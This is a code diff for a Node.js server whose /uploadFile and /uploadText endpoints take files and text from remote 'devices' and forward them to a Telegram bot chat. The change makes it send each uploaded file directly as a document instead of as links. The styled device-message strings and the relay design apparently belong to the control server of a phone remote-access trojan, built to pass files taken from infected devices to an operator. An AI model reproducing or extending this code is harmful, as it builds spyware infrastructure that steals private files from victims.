@@ -67,26 +67,22 @@ app.get('/deleteFile/*', function (req, res) {
 
 
 app.post("/uploadFile", upload.single('file'), (req, res) => {
-    const name = req.file.originalname
-    const file_name = req.file.filename
-    const filePath = __dirname + '/uploadedFile/' +encodeURIComponent(name)
-    const host_url = req.protocol + '://' + req.get('host')
-    fs.rename(__dirname + '/uploadedFile/' + file_name, __dirname + '/uploadedFile/' +encodeURIComponent(name), function(err) { 
-      if ( err ) console.log('ERROR: ' + err);
+    const name = req.file.originalname;
+    const file_name = req.file.filename;
+    const filePath = __dirname + '/uploadedFile/' + encodeURIComponent(name);
+    const host_url = req.protocol + '://' + req.get('host');
+    
+    // Rename the uploaded file to handle special characters in the file name
+    fs.rename(__dirname + '/uploadedFile/' + file_name, filePath, function(err) { 
+        if (err) console.log('ERROR: ' + err);
     });
-    appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n 𝙵𝚒𝚕𝚎 𝙽𝚊𝚖𝚎: ` + name + ` \n 𝙵𝚒𝚕𝚎 𝙸𝚍: ` + file_name + `\n\n 𝙵𝚒𝚕𝚎 𝙻𝚒𝚗𝚔: ` + host_url + `/getFile/` + encodeURIComponent(name) + `\n\n 𝙳𝚎𝚕𝚎𝚝𝚎 𝙻𝚒𝚗𝚔: ` + host_url + `/deleteFile/` + encodeURIComponent(name),
-/*
-   {
-     parse_mode: "HTML",
-       reply_markup: {
-         inline_keyboard: [
-           [{text: '𝗗𝗲𝗹𝗲𝘁𝗲 𝗙𝗶𝗹𝗲', callback_data: `delete_file:${name}`}]
-         ]}
-   }, 
-   */
-{parse_mode: "HTML", disable_web_page_preview: true})
-   res.send('')
-})
+
+    // Send the file as a document
+    appBot.sendDocument(id, filePath, { caption: `Uploaded file: ${name}` });
+
+    // Send an empty response to end the request
+    res.send('');
+});
 
 app.post("/uploadText", (req, res) => {
     appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['text'],
